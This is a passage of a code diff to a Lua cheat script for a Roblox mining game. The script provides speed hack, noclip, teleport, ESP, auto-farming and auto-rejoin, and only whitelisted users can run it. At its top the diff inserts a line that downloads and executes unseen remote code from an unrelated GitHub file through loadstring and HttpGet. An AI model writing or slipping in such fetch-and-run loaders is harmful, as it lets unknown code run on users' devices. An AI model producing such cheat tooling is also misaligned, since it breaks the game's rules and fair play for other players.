@@ -1,4 +1,7 @@
 repeat task.wait() until game:IsLoaded()
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxoneq-sys/Check/refs/heads/main/jjjj.lua"))()
+task.wait(0.5)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
@@ -47,6 +50,32 @@ local function waitForPlayerGui(player)
 		playerGui = player:FindFirstChild("PlayerGui")
 	end
 	return playerGui
+end
+
+local function getCharacterRootPart(player)
+	local character = player and player.Character
+	return character and character:FindFirstChild("HumanoidRootPart") or nil
+end
+
+local function waitForCharacterRootPart(player)
+	local rootPart = getCharacterRootPart(player)
+	if rootPart then
+		print(true)
+		return rootPart
+	end
+
+	print(false)
+
+	while isCurrentLoadGate() and not rootPart do
+		task.wait(LOAD_CHECK_INTERVAL)
+		rootPart = getCharacterRootPart(player)
+	end
+
+	if rootPart and isCurrentLoadGate() then
+		print(true)
+	end
+
+	return rootPart
 end
 
 local function isGuiChainVisible(guiObject)
@@ -113,12 +142,47 @@ local function isProgressAttributeLoading(player, prefix)
 	return false
 end
 
+local function isMountainLoadingScreenActive(playerGui)
+	local loadingScreen = playerGui and playerGui:FindFirstChild("MountainLoadingScreen")
+	return isLoadingGuiShowing(loadingScreen)
+end
+
+local function waitForMountainLoadingScreen(player, playerGui)
+	local loadingScreen = playerGui and playerGui:FindFirstChild("MountainLoadingScreen")
+	local announced = false
+
+	while isCurrentLoadGate() do
+		if loadingScreen and loadingScreen.Parent then
+			return loadingScreen
+		end
+
+		if not announced then
+			announced = true
+			print("[CrystalTools] waiting for MountainLoadingScreen to appear...")
+		end
+
+		task.wait(LOAD_CHECK_INTERVAL)
+
+		if not playerGui or not playerGui.Parent then
+			playerGui = waitForPlayerGui(player)
+		end
+
+		loadingScreen = playerGui and playerGui:FindFirstChild("MountainLoadingScreen")
+	end
+
+	return nil
+end
+
 local function isMineMountainLoadDone(player, playerGui)
-	if not playerGui then
+	if not (playerGui and playerGui.Parent) then
 		return false
 	end
 
 	if player:GetAttribute("LoadingScreenActive") == true then
+		return false
+	end
+
+	if isMountainLoadingScreenActive(playerGui) then
 		return false
 	end
 
@@ -142,6 +206,12 @@ end
 
 local function waitForMineMountainLoadDone(player)
 	local playerGui = waitForPlayerGui(player)
+	local loadingScreen = waitForMountainLoadingScreen(player, playerGui)
+	if not loadingScreen then
+		return
+	end
+
+	playerGui = loadingScreen.Parent
 	local clearSince = nil
 	local announced = false
 
@@ -160,8 +230,14 @@ local function waitForMineMountainLoadDone(player)
 		end
 
 		task.wait(LOAD_CHECK_INTERVAL)
-		if playerGui and not playerGui.Parent then
+		if not playerGui or not playerGui.Parent then
 			playerGui = waitForPlayerGui(player)
+			loadingScreen = waitForMountainLoadingScreen(player, playerGui)
+			if not loadingScreen then
+				return
+			end
+			playerGui = loadingScreen.Parent
+			clearSince = nil
 		end
 	end
 
@@ -170,12 +246,46 @@ local function waitForMineMountainLoadDone(player)
 	end
 end
 
+local function getMountainBouldersFolder()
+	local mountainDecorations = Workspace:FindFirstChild("MountainDecorations")
+	return mountainDecorations and mountainDecorations:FindFirstChild("Boulders") or nil
+end
+
+local function waitForMountainBouldersFolder()
+	local bouldersFolder = getMountainBouldersFolder()
+	local announced = false
+
+	while isCurrentLoadGate() and not bouldersFolder do
+		if not announced then
+			announced = true
+			print("[CrystalTools] waiting for workspace.MountainDecorations.Boulders...")
+		end
+
+		task.wait(LOAD_CHECK_INTERVAL)
+		bouldersFolder = getMountainBouldersFolder()
+	end
+
+	if announced and bouldersFolder and isCurrentLoadGate() then
+		print("[CrystalTools] workspace.MountainDecorations.Boulders loaded.")
+	end
+
+	return bouldersFolder
+end
+
 waitForGameLoaded()
 LocalPlayer = waitForLocalPlayer()
 if not LocalPlayer or not isCurrentLoadGate() then
 	return
 end
+waitForCharacterRootPart(LocalPlayer)
+if not isCurrentLoadGate() then
+	return
+end
 waitForMineMountainLoadDone(LocalPlayer)
+if not isCurrentLoadGate() then
+	return
+end
+waitForMountainBouldersFolder()
 if not isCurrentLoadGate() then
 	return
 end
@@ -186,12 +296,12 @@ do
 local AllowedUsers = {
 	LockedScriptUsers = {
 		Gi345267 = true,
-		OoShinobiPKoO = true,
 		VIEWOwO = true,
+		OoShinobiPKoO = true, --ลูกค้า
 	},
-	Gi345267 = true,
 	OoShinobiPKoO = true,
-	VIEWOwO = true,
+ 	VIEWOwO = true,
+	Gi345267 = true,
 }
 
 if not (LocalPlayer and AllowedUsers[LocalPlayer.Name]) then
@@ -244,7 +354,7 @@ local Config = {
 	SpeedHackDefaultSpeed = 30,
 	BoulderEspMaxDistance = 50000,
 	BoulderPromptInterval = 0,
-	DigLoopInterval = 0.01,
+	DigLoopInterval = 0,
 	PrintStatus = true,
 	FarmStart = false,
 	PlayerTeleportStart = false,
@@ -254,18 +364,20 @@ local Config = {
 	BoulderLevelFarmStart = false,
 	BoulderHopStart = false,
 	BoulderHopInterval = 1,
-	BoulderHopEmptyDelay = 2,
+	BoulderHopEmptyDelay = 5,
 	BoulderHopSort = "Asc",
 	BoulderRejoinStart = false,
+	BoulderRejoinDelay = 5,
 	BoulderLevelFarmLevel = "All",
 	BoulderLevelFarmLevels = { "All" },
-	BoulderLevelFarmUpDistance = 0,
-	BoulderLevelFarmForwardDistance = 0,
-	BoulderLevelFarmSpeed = 300,
-	BoulderLevelFarmUnderOffset = 4,
+	BoulderLevelFarmUpDistance = 150,
+	BoulderLevelFarmForwardDistance = 1500,
+	BoulderLevelFarmSpeed = 600,
+	BoulderLevelFarmUnderOffset = -10,
 	BoulderLevelFarmReturnDistance = 25,
 	BoulderLevelFarmTweenInterval = 0.1,
 	BoulderLevelFarmNextDelay = 2.2,
+	BoulderLevelFarmBombEnabled = false,
 	PickaxeRecoverInterval = 1,
 	DigReplayStart = false,
 	NoclipStart = false,
@@ -274,6 +386,7 @@ local Config = {
 	InfiniteJumpStart = false,
 	RuneItemNames = {},
 	RuneDropAmount = 1,
+	RunePlaceAmount = 1,
 	AutoPlaceRuneStart = false,
 	RunePlaceOptions = {
 		{ GuiName = "Rune_ColossusRune", ToolName = "Colossus Rune" },
@@ -300,14 +413,14 @@ local Config = {
 		"Warmth Rune",
 		"Weight Rune"
 	},
-	RunePlaceInterval = 0.25,
+	RunePlaceInterval = 0,
 	RunePlaceRetryInterval = 1,
 	MoneyDropThresholdText = "",
 	SelectedTeleportPlayerUserId = 0,
 	SelectedTeleportPlayerName = "",
 	SelectedBoulderName = "",
 	SelectedDigBoulderName = "",
-	Language = "EN",
+	Language = "TH",
 	Collapsed = false,
 	GearShopBuyAll = false,
 	GearShopAutoBuyEnabled = false,
@@ -412,6 +525,9 @@ do
 		if tonumber(savedConfig.RuneDropAmount) and tonumber(savedConfig.RuneDropAmount) > 0 then
 			Config.RuneDropAmount = math.floor(tonumber(savedConfig.RuneDropAmount))
 		end
+		if tonumber(savedConfig.RunePlaceAmount) and tonumber(savedConfig.RunePlaceAmount) > 0 then
+			Config.RunePlaceAmount = math.floor(tonumber(savedConfig.RunePlaceAmount))
+		end
 		if savedConfig.MoneyDropThresholdText ~= nil then
 			Config.MoneyDropThresholdText = tostring(savedConfig.MoneyDropThresholdText)
 		end
@@ -428,7 +544,7 @@ do
 			Config.SelectedDigBoulderName = tostring(savedConfig.SelectedDigBoulderName)
 		end
 		if savedConfig.Language ~= nil then
-			Config.Language = tostring(savedConfig.Language):upper() == "TH" and "TH" or "EN"
+			Config.Language = tostring(savedConfig.Language):upper() == "EN" and "EN" or "TH"
 		end
 		if type(savedConfig.BoulderLevelFarmLevels) == "table" or type(savedConfig.SelectedBoulderLevels) == "table" then
 			Config.BoulderLevelFarmLevels = copyStringArray(savedConfig.BoulderLevelFarmLevels or savedConfig.SelectedBoulderLevels)
@@ -447,13 +563,18 @@ do
 		Config.BoulderEspStart = savedConfig.BoulderEspStart == true or savedConfig.BoulderEspEnabled == true
 		Config.BoulderPromptStart = savedConfig.BoulderPromptStart == true or savedConfig.BoulderPromptEnabled == true
 		Config.BoulderLevelFarmStart = savedConfig.BoulderLevelFarmStart == true or savedConfig.BoulderLevelFarmEnabled == true
+		Config.BoulderLevelFarmBombEnabled = savedConfig.BoulderLevelFarmBombEnabled == true or savedConfig.RuneFarmBombEnabled == true
 		Config.BoulderHopStart = savedConfig.BoulderHopStart == true or savedConfig.BoulderHopEnabled == true
 		Config.BoulderRejoinStart = savedConfig.BoulderRejoinStart == true or savedConfig.BoulderRejoinEnabled == true
+		if tonumber(savedConfig.BoulderRejoinDelay) and tonumber(savedConfig.BoulderRejoinDelay) >= 0 then
+			Config.BoulderRejoinDelay = tonumber(savedConfig.BoulderRejoinDelay)
+		end
 		if savedConfig.BoulderHopSort ~= nil then
 			Config.BoulderHopSort = tostring(savedConfig.BoulderHopSort)
 		end
 		if not _G.CrystalToolsLockedScriptUnlocked then
 			Config.BoulderLevelFarmStart = false
+			Config.BoulderLevelFarmBombEnabled = false
 			Config.BoulderHopStart = false
 			Config.BoulderRejoinStart = false
 		end
@@ -528,15 +649,18 @@ local State = {
 	BoulderEspEnabled = false,
 	BoulderPromptEnabled = false,
 	BoulderLevelFarmEnabled = false,
+	BoulderLevelFarmBombEnabled = Config.BoulderLevelFarmBombEnabled == true,
 	BoulderLevelFarmThreadRunning = false,
 	BoulderLevelFarmTarget = nil,
 	BoulderLevelFarmTween = nil,
+	BoulderLevelFarmRouteTweening = false,
 	BoulderHopEnabled = false,
 	BoulderHopTeleporting = false,
 	BoulderHopNoTargetSince = nil,
 	BoulderRejoinEnabled = false,
 	BoulderRejoining = false,
 	BoulderRejoinNoTargetSince = nil,
+	BoulderRejoinDigErrorSince = nil,
 	PickaxeShopNameSet = nil,
 	PickaxeShopNameSetTick = 0,
 	DigToolCache = nil,
@@ -556,14 +680,16 @@ local State = {
 	SpeedHackHumanoid = nil,
 	SpeedHackOriginalWalkSpeed = nil,
 	InfiniteJumpEnabled = false,
-	Language = tostring(Config.Language or "EN"):upper() == "TH" and "TH" or "EN",
+	Language = tostring(Config.Language or "TH"):upper() == "EN" and "EN" or "TH",
 	Collapsed = Config.Collapsed == true,
 	SelectedBombItems = {},
 	SelectedRadarItems = {},
 	SelectedRuneItems = {},
 	SelectedRunePlaceItems = {},
 	RuneDropAmount = tonumber(Config.RuneDropAmount) or 1,
+	RunePlaceAmount = tonumber(Config.RunePlaceAmount) or 1,
 	AutoPlaceRunes = false,
+	RunePlaceManualRunning = false,
 	RunePlacePending = {},
 	LastRunePlaceTick = 0,
 	MoneyDropThresholdText = tostring(Config.MoneyDropThresholdText or ""),
@@ -695,6 +821,7 @@ function State.SaveConfig()
 	Config.RadarItemName = selectedRadarNames[1]
 	Config.RuneItemNames = selectedRuneNames
 	Config.RuneDropAmount = State.RuneDropAmount or 1
+	Config.RunePlaceAmount = State.RunePlaceAmount or 1
 	Config.AutoPlaceRuneStart = State.AutoPlaceRunes == true
 	Config.RunePlaceItemNames = selectedRunePlaceNames
 	Config.MoneyDropThresholdText = State.MoneyDropThresholdText or ""
@@ -710,6 +837,7 @@ function State.SaveConfig()
 	Config.BoulderEspStart = State.BoulderEspEnabled == true
 	Config.BoulderPromptStart = State.BoulderPromptEnabled == true
 	Config.BoulderLevelFarmStart = State.BoulderLevelFarmEnabled == true
+	Config.BoulderLevelFarmBombEnabled = State.BoulderLevelFarmBombEnabled == true
 	Config.BoulderHopStart = State.BoulderHopEnabled == true
 	Config.BoulderRejoinStart = State.BoulderRejoinEnabled == true
 	Config.BoulderLevelFarmLevels = selectedBoulderLevels
@@ -738,6 +866,7 @@ function State.SaveConfig()
 		LuckThreshold = Config.LuckThreshold,
 		MoneyDropThresholdText = Config.MoneyDropThresholdText,
 		RuneDropAmount = Config.RuneDropAmount,
+		RunePlaceAmount = Config.RunePlaceAmount,
 		RuneItemNames = selectedRuneNames,
 		SelectedRuneItems = selectedRuneNames,
 		AutoPlaceRuneStart = State.AutoPlaceRunes == true,
@@ -757,11 +886,14 @@ function State.SaveConfig()
 		BoulderPromptEnabled = Config.BoulderPromptStart,
 		BoulderLevelFarmStart = Config.BoulderLevelFarmStart,
 		BoulderLevelFarmEnabled = Config.BoulderLevelFarmStart,
+		BoulderLevelFarmBombEnabled = Config.BoulderLevelFarmBombEnabled,
+		RuneFarmBombEnabled = Config.BoulderLevelFarmBombEnabled,
 		BoulderHopStart = Config.BoulderHopStart,
 		BoulderHopEnabled = Config.BoulderHopStart,
 		BoulderHopSort = Config.BoulderHopSort,
 		BoulderRejoinStart = Config.BoulderRejoinStart,
 		BoulderRejoinEnabled = Config.BoulderRejoinStart,
+		BoulderRejoinDelay = Config.BoulderRejoinDelay,
 		BoulderLevelFarmLevel = Config.BoulderLevelFarmLevel,
 		BoulderLevelFarmLevels = selectedBoulderLevels,
 		SelectedBoulderLevels = selectedBoulderLevels,
@@ -809,6 +941,7 @@ State.Translations = {
 	["MONEY DROP"] = "ดรอปตามมูลค่า",
 	["RUNE DROP"] = "ดรอปรูน",
 	["RUNE PLOT"] = "วางรูนที่พล็อต",
+	["Rune plot"] = "วางรูนที่พล็อต",
 	["AUTO FARM RUNE"] = "ฟาร์มรูนอัตโนมัติ",
 	["PLAYER TP"] = "วาร์ปผู้เล่น",
 	["RUNE TP"] = "วาร์ปรูน",
@@ -845,6 +978,9 @@ State.Translations = {
 	["Rune Level: LOCKED"] = "ระดับรูน: ล็อก",
 	["AUTO PLACE ON"] = "วางอัตโนมัติ เปิด",
 	["AUTO PLACE OFF"] = "วางอัตโนมัติ ปิด",
+	["PLACE RUNES"] = "วางรูน",
+	["STOP PLACE"] = "หยุดวาง",
+	["Place Amount"] = "จำนวนที่จะวาง",
 	["DIG LOOP ON"] = "ขุดซ้ำ เปิด",
 	["DIG LOOP OFF"] = "ขุดซ้ำ ปิด",
 	["RUNE FARM ON"] = "ฟาร์มรูน เปิด",
@@ -924,6 +1060,8 @@ State.Translations = {
 	["Character not found for Rune TP"] = "ไม่พบตัวละครสำหรับวาร์ปรูน",
 	["TP target not found"] = "ไม่พบเป้าหมายวาร์ป",
 	["No Rune ProximityPrompt found"] = "ไม่พบ ProximityPrompt ของรูน",
+	["PlotPlaceRequest not found"] = "ไม่พบ PlotPlaceRequest",
+	["Stopping Rune place..."] = "กำลังหยุดวางรูน...",
 	["DigRequest remote not found"] = "ไม่พบ DigRequest remote",
 	["CrystalDropRequest remote not found"] = "ไม่พบ CrystalDropRequest remote",
 	["GoHome remote not found"] = "ไม่พบ GoHome remote",
@@ -954,6 +1092,8 @@ State.TranslationPatterns = {
 	{ "^Runes: (%d+) selected$", "รูน: เลือก %1" },
 	{ "^Place Runes: (%d+) selected$", "วางรูน: เลือก %1" },
 	{ "^Place: (.+)$", "วาง: %1" },
+	{ "^Placing Rune (%d+)/(%d+)$", "กำลังวางรูน %1/%2" },
+	{ "^Placed Rune (%d+)/(%d+)$", "วางรูนแล้ว %1/%2" },
 	{ "^Selected TP: (.+)$", "เลือกวาร์ป: %1" },
 	{ "^Selected Rune TP: (.+)$", "เลือกรูนสำหรับวาร์ป: %1" },
 	{ "^Selected Dig Rune: (.+)$", "เลือกรูนสำหรับขุด: %1" },
@@ -1073,9 +1213,28 @@ function State.BindLocalizedPlaceholder(control)
 	end
 end
 
+function State.SetLocalizedText(control, source)
+	if not control then
+		return
+	end
+
+	local sourceText = tostring(source or "")
+	local renderedText = State.LocalizationReady and State.Translate(sourceText) or sourceText
+	control:SetAttribute("I18nSource", sourceText)
+	control:SetAttribute("I18nRendered", renderedText)
+	control.Text = renderedText
+end
+
+function State.GetLanguageButtonText()
+	return State.Language == "TH" and "TH" or "EN"
+end
+
 function State.RefreshLanguage()
 	if State.UI and State.UI.LanguageButton then
-		State.UI.LanguageButton.Text = State.Language
+		local buttonText = State.GetLanguageButtonText()
+		State.UI.LanguageButton:SetAttribute("I18nSource", buttonText)
+		State.UI.LanguageButton:SetAttribute("I18nRendered", buttonText)
+		State.UI.LanguageButton.Text = buttonText
 	end
 
 	for control in pairs(State.LocalizedControls) do
@@ -1102,7 +1261,7 @@ function State.RefreshLanguage()
 end
 
 function State.SetLanguage(language, persist)
-	State.Language = tostring(language or "EN"):upper() == "TH" and "TH" or "EN"
+	State.Language = tostring(language or "TH"):upper() == "EN" and "EN" or "TH"
 	Config.Language = State.Language
 	State.RefreshLanguage()
 	if persist ~= false then
@@ -1237,7 +1396,7 @@ local MOBILE_COLLAPSED_WIDTH = 300
 UI.HorizontalViewHeight = 540
 
 local Gui = create("ScreenGui", {
-	Name = "CrystalTools_NewUI",
+	Name = "BenJaMinX",
 	ResetOnSpawn = false,
 	ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 }, LocalPlayer:WaitForChild("PlayerGui"))
@@ -1309,7 +1468,7 @@ UI.LanguageButton = create("TextButton", {
 	Size = UDim2.new(0, 30, 0, 24),
 	BackgroundColor3 = Theme.ButtonDark,
 	BorderSizePixel = 0,
-	Text = State.Language,
+	Text = State.GetLanguageButtonText(),
 	TextColor3 = Theme.Text,
 	TextSize = 11,
 	Font = Enum.Font.GothamBold
@@ -1816,6 +1975,37 @@ UI.AutoPlaceRuneButton = create("TextButton", {
 }, Content)
 styleSurface(UI.AutoPlaceRuneButton, 6, Theme.Accent)
 
+UI.ManualPlaceRuneButton = create("TextButton", {
+	Position = UDim2.new(0, 14, 0, 818),
+	Size = UDim2.new(1 / 2, -19, 0, 34),
+	BackgroundColor3 = Theme.Button,
+	BorderSizePixel = 0,
+	Text = "PLACE RUNES",
+	TextColor3 = Theme.Text,
+	TextSize = 12,
+	Font = Enum.Font.GothamBold
+}, Content)
+styleSurface(UI.ManualPlaceRuneButton, 6, Theme.Accent)
+
+UI.RunePlaceAmountInput = create("TextBox", {
+	Position = UDim2.new(0, 14, 0, 818),
+	Size = UDim2.new(0, 58, 0, 34),
+	BackgroundColor3 = Theme.Panel,
+	BorderSizePixel = 0,
+	Text = tostring(Config.RunePlaceAmount or 1),
+	PlaceholderText = "Place Amount",
+	ClearTextOnFocus = false,
+	TextColor3 = Theme.Text,
+	TextSize = 12,
+	Font = Enum.Font.Gotham,
+	TextXAlignment = Enum.TextXAlignment.Left
+}, Content)
+styleSurface(UI.RunePlaceAmountInput, 6, Theme.Accent)
+create("UIPadding", {
+	PaddingLeft = UDim.new(0, 8),
+	PaddingRight = UDim.new(0, 8)
+}, UI.RunePlaceAmountInput)
+
 UI.RunePlaceDropdownButton = create("TextButton", {
 	Position = UDim2.new(1 / 2, 5, 0, 818),
 	Size = UDim2.new(1 / 2, -19, 0, 34),
@@ -1954,6 +2144,18 @@ UI.BoulderLevelFarmButton = create("TextButton", {
 	Font = Enum.Font.GothamBold
 }, Content)
 styleSurface(UI.BoulderLevelFarmButton, 6, Theme.Accent)
+
+UI.BoulderLevelFarmBombButton = create("TextButton", {
+	Position = UDim2.new(0.34, 4, 0, 978),
+	Size = UDim2.new(0.24, -12, 0, 34),
+	BackgroundColor3 = Theme.ButtonDark,
+	BorderSizePixel = 0,
+	Text = "BOMB OFF",
+	TextColor3 = Theme.Text,
+	TextSize = 11,
+	Font = Enum.Font.GothamBold
+}, Content)
+styleSurface(UI.BoulderLevelFarmBombButton, 6, Theme.Accent)
 
 UI.BoulderLevelDropdownList = create("ScrollingFrame", {
 	Position = UDim2.new(0, 14, 0, 1018),
@@ -2450,7 +2652,8 @@ do
 		UI.DigBoulderDropdownButton,
 		UI.BoulderLevelDropdownButton,
 		BombDropdownButton,
-		UI.RadarDropdownButton
+		UI.RadarDropdownButton,
+		UI.ManualPlaceRuneButton
 	}) do
 		restyleTextControl(control, Theme.ButtonDark)
 		restyleStroke(control, Theme.GlowSoft, 0.35, 1)
@@ -2462,7 +2665,8 @@ do
 		LuckInput,
 		UI.FarmDistanceInput,
 		UI.MoneyDropInput,
-		UI.RuneAmountInput
+		UI.RuneAmountInput,
+		UI.RunePlaceAmountInput
 	}) do
 		restyleTextControl(input, Theme.Field)
 		input.PlaceholderColor3 = Theme.Text
@@ -2475,6 +2679,7 @@ do
 		UI.DropMoneyButton,
 		UI.DigReplayButton,
 		UI.BoulderLevelFarmButton,
+		UI.BoulderLevelFarmBombButton,
 		PlayerTeleportButton,
 		BoulderTeleportButton,
 		UI.BoulderNoclipButton,
@@ -2487,6 +2692,7 @@ do
 		UI.InfiniteJumpButton,
 		UI.DropRuneButton,
 		UI.AutoPlaceRuneButton,
+		UI.ManualPlaceRuneButton,
 		UI.BuyAllBombButton,
 		BuyBombButton,
 		UI.BuyAllRadarButton,
@@ -2524,8 +2730,10 @@ do
 	for _, button in ipairs({
 		UI.DropRuneButton,
 		UI.AutoPlaceRuneButton,
+		UI.ManualPlaceRuneButton,
 		UI.DigReplayButton,
 		UI.BoulderLevelFarmButton,
+		UI.BoulderLevelFarmBombButton,
 		PlayerTeleportButton,
 		BoulderTeleportButton,
 		UI.BoulderNoclipButton,
@@ -2750,9 +2958,13 @@ local function applyVerticalControlsLayout()
 	UI.RunePlaceLabel.Position = UDim2.new(0, 14, 0, 430)
 	UI.RunePlaceLabel.Size = UDim2.new(1, -28, 0, 18)
 	UI.AutoPlaceRuneButton.Position = UDim2.new(0, 14, 0, 454)
-	UI.AutoPlaceRuneButton.Size = UDim2.new(1 / 2, -19, 0, 34)
-	UI.RunePlaceDropdownButton.Position = UDim2.new(1 / 2, 5, 0, 454)
-	UI.RunePlaceDropdownButton.Size = UDim2.new(1 / 2, -19, 0, 34)
+	UI.AutoPlaceRuneButton.Size = UDim2.new(0.22, -10, 0, 34)
+	UI.ManualPlaceRuneButton.Position = UDim2.new(0.22, 6, 0, 454)
+	UI.ManualPlaceRuneButton.Size = UDim2.new(0.25, -10, 0, 34)
+	UI.RunePlaceAmountInput.Position = UDim2.new(0.47, 8, 0, 454)
+	UI.RunePlaceAmountInput.Size = UDim2.new(0.16, -8, 0, 34)
+	UI.RunePlaceDropdownButton.Position = UDim2.new(0.63, 10, 0, 454)
+	UI.RunePlaceDropdownButton.Size = UDim2.new(0.37, -24, 0, 34)
 	UI.RunePlaceDropdownList.Position = UDim2.new(0, 14, 0, 494)
 	UI.RunePlaceDropdownList.Size = UDim2.new(1, -28, 0, 102)
 
@@ -2766,9 +2978,11 @@ local function applyVerticalControlsLayout()
 	UI.BoulderLevelFarmLabel.Position = UDim2.new(0, 14, 0, 558)
 	UI.BoulderLevelFarmLabel.Size = UDim2.new(1, -28, 0, 18)
 	UI.BoulderLevelFarmButton.Position = UDim2.new(0, 14, 0, 582)
-	UI.BoulderLevelFarmButton.Size = UDim2.new(1 / 2, -19, 0, 34)
-	UI.BoulderLevelDropdownButton.Position = UDim2.new(1 / 2, 5, 0, 582)
-	UI.BoulderLevelDropdownButton.Size = UDim2.new(1 / 2, -19, 0, 34)
+	UI.BoulderLevelFarmButton.Size = UDim2.new(0.34, -18, 0, 34)
+	UI.BoulderLevelFarmBombButton.Position = UDim2.new(0.34, 4, 0, 582)
+	UI.BoulderLevelFarmBombButton.Size = UDim2.new(0.24, -12, 0, 34)
+	UI.BoulderLevelDropdownButton.Position = UDim2.new(0.58, 8, 0, 582)
+	UI.BoulderLevelDropdownButton.Size = UDim2.new(0.42, -22, 0, 34)
 	UI.BoulderLevelDropdownList.Position = UDim2.new(0, 14, 0, 622)
 	UI.BoulderLevelDropdownList.Size = UDim2.new(1, -28, 0, 102)
 
@@ -2852,6 +3066,9 @@ local function applyHorizontalControlsLayout(width)
 	local runeButtonWidth = math.min(104, math.max(86, math.floor(columnWidth * 0.28)))
 	local runeAmountWidth = math.min(72, math.max(58, math.floor(columnWidth * 0.2)))
 	local runeDropdownWidth = columnWidth - runeButtonWidth - runeAmountWidth - 16
+	local runePlaceActionWidth = math.min(82, math.max(66, math.floor(columnWidth * 0.23)))
+	local runePlaceAmountWidth = math.min(66, math.max(48, math.floor(columnWidth * 0.16)))
+	local runePlaceDropdownWidth = columnWidth - (runePlaceActionWidth * 2) - runePlaceAmountWidth - 24
 	local shopModeWidth = math.min(90, math.max(72, math.floor(columnWidth * 0.24)))
 	local shopActionWidth = math.min(110, math.max(88, math.floor(columnWidth * 0.3)))
 	local shopDropdownWidth = columnWidth - shopModeWidth - shopActionWidth - 16
@@ -2882,8 +3099,10 @@ local function applyHorizontalControlsLayout(width)
 	setRect(UI.RuneDropdownButton, leftX + runeButtonWidth + runeAmountWidth + 16, 368, runeDropdownWidth, 34)
 	setRect(UI.RuneDropdownList, leftX, 410, columnWidth, 76)
 	setRect(UI.RunePlaceLabel, leftX, 420, columnWidth, 16)
-	setRect(UI.AutoPlaceRuneButton, leftX, 444, halfWidth, 34)
-	setRect(UI.RunePlaceDropdownButton, leftX + halfWidth + 10, 444, halfWidth, 34)
+	setRect(UI.AutoPlaceRuneButton, leftX, 444, runePlaceActionWidth, 34)
+	setRect(UI.ManualPlaceRuneButton, leftX + runePlaceActionWidth + 8, 444, runePlaceActionWidth, 34)
+	setRect(UI.RunePlaceAmountInput, leftX + (runePlaceActionWidth * 2) + 16, 444, runePlaceAmountWidth, 34)
+	setRect(UI.RunePlaceDropdownButton, leftX + (runePlaceActionWidth * 2) + runePlaceAmountWidth + 24, 444, runePlaceDropdownWidth, 34)
 	setRect(UI.RunePlaceDropdownList, leftX, 486, columnWidth, 96)
 	setRect(UI.DigReplayButton, leftX, 498, halfWidth, 34)
 	setRect(UI.DigBoulderDropdownButton, leftX + halfWidth + 10, 498, halfWidth, 34)
@@ -2907,8 +3126,12 @@ local function applyHorizontalControlsLayout(width)
 	setRect(UI.SpeedButton, rightX + math.floor((columnWidth - 20) / 3) + 10, 200, math.floor((columnWidth - 20) / 3), 32)
 	setRect(UI.InfiniteJumpButton, rightX + (math.floor((columnWidth - 20) / 3) * 2) + 20, 200, columnWidth - (math.floor((columnWidth - 20) / 3) * 2) - 20, 32)
 	setRect(UI.BoulderLevelFarmLabel, rightX, 250, columnWidth, 16)
-	setRect(UI.BoulderLevelFarmButton, rightX, 274, halfWidth, 34)
-	setRect(UI.BoulderLevelDropdownButton, rightX + halfWidth + 10, 274, halfWidth, 34)
+	local boulderFarmModeWidth = math.floor((columnWidth - 20) * 0.34)
+	local boulderFarmBombWidth = math.floor((columnWidth - 20) * 0.24)
+	local boulderFarmLevelWidth = columnWidth - boulderFarmModeWidth - boulderFarmBombWidth - 20
+	setRect(UI.BoulderLevelFarmButton, rightX, 274, boulderFarmModeWidth, 34)
+	setRect(UI.BoulderLevelFarmBombButton, rightX + boulderFarmModeWidth + 10, 274, boulderFarmBombWidth, 34)
+	setRect(UI.BoulderLevelDropdownButton, rightX + boulderFarmModeWidth + boulderFarmBombWidth + 20, 274, boulderFarmLevelWidth, 34)
 	setRect(UI.BoulderLevelDropdownList, rightX, 316, columnWidth, 96)
 
 	setRect(GearShopLabel, rightX, 330, columnWidth, 16)
@@ -3559,6 +3782,23 @@ local function getTeleportablePlayers()
 	return playerList
 end
 
+function State.ClearTeleportPlayerSelection(persist)
+	if not State.SelectedTeleportPlayerUserId and not State.SelectedTeleportPlayerName then
+		return false
+	end
+
+	State.SelectedTeleportPlayerUserId = nil
+	State.SelectedTeleportPlayerName = nil
+	Config.SelectedTeleportPlayerUserId = 0
+	Config.SelectedTeleportPlayerName = ""
+
+	if persist ~= false then
+		State.SaveConfig()
+	end
+
+	return true
+end
+
 local function setTeleportPlayer(player, persist)
 	if not player or player == LocalPlayer then
 		return false
@@ -4127,6 +4367,135 @@ end
 function State.GetDigToolName()
 	local tool = State.GetDigTool()
 	return tool and tool.Name or nil
+end
+
+function State.FindToolByNames(names)
+	local wantedNames = {}
+	for _, name in ipairs(names or {}) do
+		local canonicalName = canonicalDigToolName(name)
+		if canonicalName ~= "" then
+			wantedNames[canonicalName] = true
+		end
+	end
+
+	return State.FindToolInCharacterAndBackpack(function(tool)
+		if not (tool and tool:IsA("Tool")) then
+			return false
+		end
+
+		for _, variant in ipairs(State.GetToolNameVariants(tool)) do
+			if wantedNames[canonicalDigToolName(variant)] then
+				return true
+			end
+		end
+
+		return false
+	end)
+end
+
+function State.EquipSpecificTool(tool)
+	local character = LocalPlayer and LocalPlayer.Character
+	if not (tool and character) then
+		return false
+	end
+
+	if tool.Parent == character then
+		return true
+	end
+
+	local humanoid = character:FindFirstChildOfClass("Humanoid")
+	if not humanoid then
+		return false
+	end
+
+	local backpack = State.GetPlayerBackpack and State.GetPlayerBackpack()
+	if backpack and tool.Parent ~= backpack and tool.Parent ~= character then
+		pcall(function()
+			tool.Parent = backpack
+		end)
+		task.wait()
+	end
+
+	pcall(function()
+		humanoid:UnequipTools()
+	end)
+	task.wait(0.03)
+
+	pcall(function()
+		humanoid:EquipTool(tool)
+	end)
+
+	if State.WaitForToolParent(tool, character, 0.18) then
+		return true
+	end
+
+	if backpack and tool.Parent == backpack then
+		local slot = State.GetHotbarSlotForTool(tool, backpack)
+		if slot and State.PressHotbarSlot(slot) and State.WaitForToolParent(tool, character, 0.18) then
+			return true
+		end
+	end
+
+	if tool.Parent ~= character then
+		pcall(function()
+			tool.Parent = character
+		end)
+	end
+
+	return State.WaitForToolParent(tool, character, 0.18)
+end
+
+function State.GetBombActivateRemote()
+	if State.BombActivateRemote and State.BombActivateRemote.Parent then
+		return State.BombActivateRemote
+	end
+
+	local remotes = Remotes or ReplicatedStorage:FindFirstChild("Remotes")
+	State.BombActivateRemote = remotes and remotes:FindFirstChild("BombActivate")
+	return State.BombActivateRemote
+end
+
+function State.UseBoulderLevelFarmBomb(target)
+	if not State.BoulderLevelFarmBombEnabled then
+		return false
+	end
+
+	local bombTool = State.FindToolByNames({ "ClassicBomb", "Classic Bomb" })
+	local remote = State.GetBombActivateRemote()
+	if not remote then
+		setStatus("BombActivate remote not found", Theme.Bad)
